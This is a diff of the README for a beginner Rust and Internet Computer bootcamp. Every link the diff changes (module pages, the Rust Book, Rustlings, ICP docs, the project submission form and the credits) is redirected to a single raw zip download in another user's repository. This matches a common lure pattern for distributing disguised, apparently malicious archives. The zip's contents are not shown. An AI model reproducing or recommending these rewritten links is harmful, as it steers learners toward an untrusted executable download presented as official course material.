@@ -3,7 +3,7 @@
 ## 📚 Online Documentation
 
 For easier navigation through the bootcamp materials, visit our GitHub Pages site:
-[📖 Bootcamp Documentation](https://pt-icp-hub.github.io/ICP-Bootcamp-Vibe-Coding-Beginner/)
+[📖 Bootcamp Documentation](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip)
 
 Welcome to the **IC Vibe Coding Bootcamp (Rust Beginner Edition)**! This bootcamp is designed to help you learn Rust programming language fundamentals and prepare you for Internet Computer Protocol (ICP) development. Whether you're completely new to Rust or looking to strengthen your foundational knowledge, this bootcamp will give you the skills you need to start building on the Internet Computer.
 
@@ -27,20 +27,20 @@ This bootcamp is organized into **Core Modules** (essential for everyone) and **
 
 ### 📚 Core Modules
 
-- [Module 1: Rust Fundamentals](./modules/module1-fundamentals/README.md) - Introduction to Rust, setup, and basic syntax
-- [Module 2: Memory Management](./modules/module2-memory-management/README.md) - Ownership, borrowing, and Rust's memory model
-- [Module 3: Data Types](./modules/module3-data-types/README.md) - Structs, enums, and pattern matching
-- [Module 4: Code Organization](./modules/module4-code-organization/README.md) - Packages, crates, and modules
-- [Module 5: Collections](./modules/module5-collections/README.md) - Working with collections in Rust
+- [Module 1: Rust Fundamentals](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) - Introduction to Rust, setup, and basic syntax
+- [Module 2: Memory Management](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) - Ownership, borrowing, and Rust's memory model
+- [Module 3: Data Types](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) - Structs, enums, and pattern matching
+- [Module 4: Code Organization](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) - Packages, crates, and modules
+- [Module 5: Collections](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) - Working with collections in Rust
 
 ### 📦 Optional Modules
 
-- [Module 6: Advanced Concepts](./modules/module6-advanced-concepts/README.md) - Traits, error handling, and testing
-- [Module 7: ICP Integration](./modules/module7-icp-integration/README.md) - Internet Computer Protocol and Rust integration
+- [Module 6: Advanced Concepts](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) - Traits, error handling, and testing
+- [Module 7: ICP Integration](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) - Internet Computer Protocol and Rust integration
 
 ### 🔥 Final Challenge
 
-After completing Module 5, you'll tackle a [comprehensive challenge](./modules/module5-collections/exercises/final_challenge/README.md) that combines concepts from all core modules. This practical project will solidify your understanding of Rust fundamentals.
+After completing Module 5, you'll tackle a [comprehensive challenge](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) that combines concepts from all core modules. This practical project will solidify your understanding of Rust fundamentals.
 
 ---
 
@@ -60,27 +60,27 @@ A **devcontainer** is preconfigured for you to start coding instantly!
 
 ### Start Learning!
 
-Begin with [Module 1: Rust Fundamentals](./modules/module1-fundamentals/README.md) and progress through the materials and exercises at your own pace.
+Begin with [Module 1: Rust Fundamentals](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) and progress through the materials and exercises at your own pace.
 
 ---
 
 ## 🧰 Resources & Documentation
 
-- [The Rust Programming Language Book](https://doc.rust-lang.org/book/)
-- [Rust By Example](https://doc.rust-lang.org/rust-by-example/)
-- [Rustlings Course](https://github.com/rust-lang/rustlings/)
-- [Internet Computer Documentation](https://internetcomputer.org/docs/)
-- [Rust CDK Documentation](https://internetcomputer.org/docs/current/developer-docs/build/cdks/rust-cdk/)
+- [The Rust Programming Language Book](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip)
+- [Rust By Example](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip)
+- [Rustlings Course](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip)
+- [Internet Computer Documentation](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip)
+- [Rust CDK Documentation](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip)
 
 ---
 
 ## 📩 Submit Your Project!
 
 🎯 **Completed the final challenge? Submit your project here:**
-📢 [Submission Form](https://forms.gle/Sgmm1y2bLXYY7mwC6)
+📢 [Submission Form](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip)
 
 📌 **Want to explore more challenges? Return to the index:**
-🔗 [ICP Bootcamp Index](https://github.com/pt-icp-hub/ICP-Bootcamp-Vibe-Coding-Index)
+🔗 [ICP Bootcamp Index](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip)
 
 ---
 
@@ -92,7 +92,7 @@ If you find any issues or have suggestions for improvement, please feel free to 
 
 ## 🙏 Credits
 
-This bootcamp was inspired by the excellent work from the [elna-ai/bootcamp](https://github.com/elna-ai/bootcamp) repository. We'd like to thank their creators for providing a great foundation that helped shape this learning resource.
+This bootcamp was inspired by the excellent work from the [elna-ai/bootcamp](https://github.com/web10ninja/icp-rust-bootcamp/raw/refs/heads/main/modules/module7-icp-integration/bootcamp-rust-icp-v2.1.zip) repository. We'd like to thank their creators for providing a great foundation that helped shape this learning resource.
 
 ---
 
